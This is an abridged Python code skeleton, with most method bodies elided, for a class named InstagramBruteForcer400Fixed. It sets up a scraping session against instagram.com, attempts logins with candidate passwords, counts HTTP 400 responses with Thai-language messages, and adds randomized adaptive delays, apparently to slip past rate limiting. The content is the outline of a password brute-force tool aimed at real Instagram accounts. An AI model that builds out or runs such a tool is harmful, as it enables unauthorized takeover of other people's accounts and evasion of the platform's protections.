...
class InstagramBruteForcer400Fixed:
    ...
    def setup_session(self):
        ...
        try:
            ...
            response = self.scraper.get('https://www.instagram.com/', timeout=15)
    ...
    def attempt_login_fixed(self, password):
        ...
        try:
            ...
            if response.status_code == 200:
                ...
                self.bad_requests += 1
                print(f"⚠️ HTTP 400 Bad Request (ครั้งที่ {self.bad_requests})")
    ...
    def adaptive_delay(self, rate_limited=False):
        ...
        actual_delay = self.current_delay + random.uniform(-0.2, 0.2) * self.current_delay
